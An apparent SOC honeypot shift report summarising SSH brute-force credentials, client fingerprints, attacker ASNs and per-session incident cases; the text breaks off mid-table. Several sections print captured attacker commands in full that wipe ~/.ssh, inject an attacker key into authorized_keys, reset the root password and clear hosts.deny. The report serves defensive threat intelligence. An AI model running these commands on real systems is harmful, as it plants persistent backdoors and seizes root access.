# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-20 |
| **Generated At** | 2026-04-20T22:51:00Z |
| **Shift Time** | 22:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **299** |
| Confirmed Threats | **294** |
| False Positives Filtered | **5** (1.7%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **11** |
| High Severity Cases | **116** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **183** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **263** |
| Unique Credential Pairs | **106** |
| Unique Usernames | **46** |
| Unique Passwords | **101** |
| Successful Auth Pairs | **69** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 116 |
| `345gs5662d34` | 55 |
| `postgres` | 12 |
| `ubuntu` | 11 |
| `steam` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 55 |
| `3245gs5662d34` | 55 |
| `test` | 4 |
| `aA123456@` | 3 |
| `123456` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 55 |
| `root` | `3245gs5662d34` | 55 |
| `postgres` | `1234567` | 3 |
| `sinusbot` | `test` | 2 |
| `ubuntu` | `AAAA123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssw0rd01!` | `196.189.237.92` | 2026-04-20T21:04:33 |
| `root` | `3245gs5662d34` | `196.189.237.92` | 2026-04-20T21:04:38 |
| `root` | `ZAQ!2wsx2024..` | `84.247.162.228` | 2026-04-20T21:04:38 |
| `root` | `3245gs5662d34` | `84.247.162.228` | 2026-04-20T21:04:42 |
| `root` | `q1234567` | `81.193.216.17` | 2026-04-20T21:05:11 |
| `root` | `3245gs5662d34` | `81.193.216.17` | 2026-04-20T21:05:16 |
| `root` | `ZZqq000` | `84.247.162.228` | 2026-04-20T21:06:11 |
| `root` | `QWERTYUIOP12345678` | `81.193.216.17` | 2026-04-20T21:07:02 |
| `root` | `DDzz112233` | `81.193.216.17` | 2026-04-20T21:08:54 |
| `root` | `test2025@` | `196.189.237.92` | 2026-04-20T21:09:48 |
| `root` | `QA2ws3ed` | `152.32.253.205` | 2026-04-20T21:10:15 |
| `root` | `3245gs5662d34` | `152.32.253.205` | 2026-04-20T21:10:18 |
| `root` | `12qwaszx` | `196.189.237.92` | 2026-04-20T21:11:34 |
| `root` | `qazwsx2024#` | `152.32.131.112` | 2026-04-20T21:11:47 |
| `root` | `3245gs5662d34` | `152.32.131.112` | 2026-04-20T21:11:51 |
| `root` | `Star@2025` | `81.193.216.17` | 2026-04-20T21:12:23 |
| `root` | `L@y3rh0st2025` | `81.193.216.17` | 2026-04-20T21:15:47 |
| `root` | `Qwert!12345` | `196.189.237.92` | 2026-04-20T21:18:38 |
| `root` | `qwert11111` | `84.247.162.228` | 2026-04-20T21:19:07 |
| `root` | `Centos2025` | `196.189.237.92` | 2026-04-20T21:20:26 |
| `root` | `QWERTYUIOP123456@` | `84.247.162.228` | 2026-04-20T21:20:49 |
| `root` | `Root1111@123` | `81.193.216.17` | 2026-04-20T21:21:07 |
| `root` | `q1234567` | `84.247.162.228` | 2026-04-20T21:22:31 |
| `root` | `Qazwsx000#$` | `196.189.237.92` | 2026-04-20T21:25:40 |
| `root` | `Star@2025` | `84.247.162.228` | 2026-04-20T21:25:55 |
| `root` | `Abcd12345678#$` | `196.189.237.92` | 2026-04-20T21:27:23 |
| `root` | `Admin!23` | `84.247.162.228` | 2026-04-20T21:27:35 |
| `root` | `Admin!23` | `81.193.216.17` | 2026-04-20T21:28:04 |
| `root` | `ZAQ!2wsx2024..` | `81.193.216.17` | 2026-04-20T21:29:47 |
| `root` | `123456Dd` | `196.189.237.92` | 2026-04-20T21:30:55 |
| `root` | `DDzz112233` | `84.247.162.228` | 2026-04-20T21:30:58 |
| `root` | `Root1111@123` | `84.247.162.228` | 2026-04-20T21:32:39 |
| `root` | `Market123` | `196.189.237.92` | 2026-04-20T21:32:43 |
| `root` | `ZZqq000` | `81.193.216.17` | 2026-04-20T21:33:24 |
| `root` | `QWERTYUIOP12345678` | `84.247.162.228` | 2026-04-20T21:34:19 |
| `root` | `L@y3rh0st2025` | `84.247.162.228` | 2026-04-20T21:37:45 |
| `root` | `!23456Qwerty` | `196.189.237.92` | 2026-04-20T21:38:00 |
| `root` | `Qazwsx6666..` | `196.189.237.92` | 2026-04-20T21:39:44 |
| `root` | `qwert11111` | `81.193.216.17` | 2026-04-20T21:40:30 |
| `root` | `QWERTYUIOP123456@` | `81.193.216.17` | 2026-04-20T21:42:15 |
| `root` | `Root8888@123` | `196.189.237.92` | 2026-04-20T21:43:13 |
| `root` | `webserver` | `196.189.237.92` | 2026-04-20T21:45:02 |
| `root` | `root05` | `181.65.191.218` | 2026-04-20T21:47:37 |
| `root` | `3245gs5662d34` | `181.65.191.218` | 2026-04-20T21:47:44 |
| `root` | `11235813` | `158.180.79.132` | 2026-04-20T21:48:20 |
| `root` | `CCdd1234` | `158.180.79.132` | 2026-04-20T21:51:00 |
| `root` | `3245gs5662d34` | `158.180.79.132` | 2026-04-20T21:51:09 |
| `root` | `qwert123456` | `158.180.79.132` | 2026-04-20T21:53:39 |
| `root` | `11235813` | `181.65.191.218` | 2026-04-20T21:59:04 |
| `root` | `qwert123456` | `181.65.191.218` | 2026-04-20T22:00:45 |
| `root` | `Qwe1234567` | `158.180.79.132` | 2026-04-20T22:04:07 |
| `root` | `BBqq123` | `181.65.191.218` | 2026-04-20T22:06:20 |
| `root` | `!@#$1234qwer` | `158.180.79.132` | 2026-04-20T22:06:45 |
| `root` | `lj123456` | `165.154.6.104` | 2026-04-20T22:08:29 |
| `root` | `3245gs5662d34` | `165.154.6.104` | 2026-04-20T22:08:32 |
| `root` | `qazwsx12345..` | `165.154.6.104` | 2026-04-20T22:11:43 |
| `root` | `Qwe1234567` | `181.65.191.218` | 2026-04-20T22:12:56 |
| `root` | `debian` | `106.13.68.234` | 2026-04-20T22:13:19 |
| `root` | `aA123456@` | `165.154.6.104` | 2026-04-20T22:16:16 |
| `root` | `root123321@#` | `181.65.191.218` | 2026-04-20T22:17:56 |
| `root` | `Root112233#` | `165.154.6.104` | 2026-04-20T22:20:54 |
| `root` | `CCdd1234` | `181.65.191.218` | 2026-04-20T22:21:14 |
| `root` | `!@#$1234qwer` | `181.65.191.218` | 2026-04-20T22:24:35 |
| `root` | `Hl123456.` | `165.154.6.104` | 2026-04-20T22:25:43 |
| `root` | `Secure@2025` | `165.154.6.104` | 2026-04-20T22:30:21 |
| `root` | `lj123456` | `14.103.46.177` | 2026-04-20T22:31:36 |
| `root` | `aA123456@` | `115.191.18.114` | 2026-04-20T22:33:00 |
| `root` | `11111111` | `165.154.6.104` | 2026-04-20T22:38:14 |
| `root` | `BBqq123` | `158.180.79.132` | 2026-04-20T22:40:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **299** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 287 |
| Go SSH scanner | 3 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 281 | 15 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |
| `97281db8c1a6...` | Modern SSH client | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 281 | 15 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 5 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `97281db8c1a6...` | libssh | 1 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 55 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gm2LUCSt2pjp"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.46.177`, `158.180.79.132`, `115.191.18.114`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.253.205`, `81.193.216.17`, `158.180.79.132`, `152.32.131.112`, `84.247.162.228`, `165.154.6.104`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **21** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS14987` | Rethem Hosting LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS6147` | INTEGRATEL PERÚ S.A.A. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (116)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-56b280155eba

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:04 |
| **Last Seen** | 2026-04-20 21:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:04:32` | `cowrie.session.connect` |
| `2026-04-20 21:04:32` | `cowrie.client.version` |
| `2026-04-20 21:04:32` | `cowrie.client.kex` |
| `2026-04-20 21:04:33` | `cowrie.login.success` |
| `2026-04-20 21:04:34` | `cowrie.session.params` |
| `2026-04-20 21:04:34` | `cowrie.command.input` |
| `2026-04-20 21:04:34` | `cowrie.command.failed` |
| `2026-04-20 21:04:34` | `cowrie.log.closed` |
| `2026-04-20 21:04:34` | `cowrie.session.params` |
| `2026-04-20 21:04:34` | `cowrie.command.input` |
| `2026-04-20 21:04:34` | `cowrie.session.file_download` |
| `2026-04-20 21:04:34` | `cowrie.log.closed` |
| `2026-04-20 21:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa04895b4c93

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]92` |
| **First Seen** | 2026-04-20 21:04 |
| **Last Seen** | 2026-04-20 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:04:37` | `cowrie.session.connect` |
| `2026-04-20 21:04:37` | `cowrie.client.version` |
| `2026-04-20 21:04:37` | `cowrie.client.kex` |
| `2026-04-20 21:04:38` | `cowrie.login.success` |
| `2026-04-20 21:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]92` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66785bb7cd7c

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:04 |
| **Last Seen** | 2026-04-20 21:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:04:38` | `cowrie.session.connect` |
| `2026-04-20 21:04:38` | `cowrie.client.version` |
| `2026-04-20 21:04:38` | `cowrie.client.kex` |
| `2026-04-20 21:04:38` | `cowrie.login.success` |
| `2026-04-20 21:04:38` | `cowrie.session.params` |
| `2026-04-20 21:04:38` | `cowrie.command.input` |
| `2026-04-20 21:04:38` | `cowrie.command.failed` |
| `2026-04-20 21:04:39` | `cowrie.log.closed` |
| `2026-04-20 21:04:39` | `cowrie.session.params` |
| `2026-04-20 21:04:39` | `cowrie.command.input` |
| `2026-04-20 21:04:39` | `cowrie.session.file_download` |
| `2026-04-20 21:04:39` | `cowrie.log.closed` |
| `2026-04-20 21:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb56f7f239f1

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:04 |
| **Last Seen** | 2026-04-20 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:04:41` | `cowrie.session.connect` |
| `2026-04-20 21:04:41` | `cowrie.client.version` |
| `2026-04-20 21:04:41` | `cowrie.client.kex` |
| `2026-04-20 21:04:42` | `cowrie.login.success` |
| `2026-04-20 21:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d366d748b9bb

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:05 |
| **Last Seen** | 2026-04-20 21:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:05:10` | `cowrie.session.connect` |
| `2026-04-20 21:05:10` | `cowrie.client.version` |
| `2026-04-20 21:05:10` | `cowrie.client.kex` |
| `2026-04-20 21:05:11` | `cowrie.login.success` |
| `2026-04-20 21:05:11` | `cowrie.session.params` |
| `2026-04-20 21:05:11` | `cowrie.command.input` |
| `2026-04-20 21:05:11` | `cowrie.command.failed` |
| `2026-04-20 21:05:11` | `cowrie.log.closed` |
| `2026-04-20 21:05:12` | `cowrie.session.params` |
| `2026-04-20 21:05:12` | `cowrie.command.input` |
| `2026-04-20 21:05:12` | `cowrie.session.file_download` |
| `2026-04-20 21:05:12` | `cowrie.log.closed` |
| `2026-04-20 21:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2dcd98354e

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:05 |
| **Last Seen** | 2026-04-20 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:05:15` | `cowrie.session.connect` |
| `2026-04-20 21:05:15` | `cowrie.client.version` |
| `2026-04-20 21:05:15` | `cowrie.client.kex` |
| `2026-04-20 21:05:16` | `cowrie.login.success` |
| `2026-04-20 21:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da5265693af

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:06 |
| **Last Seen** | 2026-04-20 21:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:06:10` | `cowrie.session.connect` |
| `2026-04-20 21:06:10` | `cowrie.client.version` |
| `2026-04-20 21:06:10` | `cowrie.client.kex` |
| `2026-04-20 21:06:11` | `cowrie.login.success` |
| `2026-04-20 21:06:11` | `cowrie.session.params` |
| `2026-04-20 21:06:11` | `cowrie.command.input` |
| `2026-04-20 21:06:11` | `cowrie.command.failed` |
| `2026-04-20 21:06:11` | `cowrie.log.closed` |
| `2026-04-20 21:06:11` | `cowrie.session.params` |
| `2026-04-20 21:06:11` | `cowrie.command.input` |
| `2026-04-20 21:06:11` | `cowrie.session.file_download` |
| `2026-04-20 21:06:11` | `cowrie.log.closed` |
| `2026-04-20 21:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45019ac54bd1

| Field | Detail |
|---|---|
| **Source IP** | `84.247.162[.]228` |
| **First Seen** | 2026-04-20 21:06 |
| **Last Seen** | 2026-04-20 21:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:06:13` | `cowrie.session.connect` |
| `2026-04-20 21:06:13` | `cowrie.client.version` |
| `2026-04-20 21:06:14` | `cowrie.client.kex` |
| `2026-04-20 21:06:14` | `cowrie.login.success` |
| `2026-04-20 21:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.247.162[.]228` to AbuseIPDB if not already reported
- [ ] Block `84.247.162[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cff318446da

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:07 |
| **Last Seen** | 2026-04-20 21:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:07:01` | `cowrie.session.connect` |
| `2026-04-20 21:07:01` | `cowrie.client.version` |
| `2026-04-20 21:07:01` | `cowrie.client.kex` |
| `2026-04-20 21:07:02` | `cowrie.login.success` |
| `2026-04-20 21:07:03` | `cowrie.session.params` |
| `2026-04-20 21:07:03` | `cowrie.command.input` |
| `2026-04-20 21:07:03` | `cowrie.command.failed` |
| `2026-04-20 21:07:03` | `cowrie.log.closed` |
| `2026-04-20 21:07:03` | `cowrie.session.params` |
| `2026-04-20 21:07:03` | `cowrie.command.input` |
| `2026-04-20 21:07:03` | `cowrie.session.file_download` |
| `2026-04-20 21:07:03` | `cowrie.log.closed` |
| `2026-04-20 21:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.193.216[.]17` to AbuseIPDB if not already reported
- [ ] Block `81.193.216[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb5b7a70310

| Field | Detail |
|---|---|
| **Source IP** | `81.193.216[.]17` |
| **First Seen** | 2026-04-20 21:07 |
| **Last Seen** | 2026-04-20 21:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
